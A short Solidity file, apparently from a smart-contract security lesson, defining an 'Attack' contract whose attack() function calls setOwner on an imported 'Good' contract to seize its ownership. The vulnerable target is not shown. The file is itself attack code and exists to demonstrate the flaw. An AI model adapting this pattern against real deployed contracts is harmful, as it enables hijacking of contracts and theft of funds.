// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "./Good.sol";

contract Attack {
    Good public good;

    constructor(address _good) {
        good = Good(_good);
    }

    function attack() public {
        good.setOwner(address(this));
    }
}
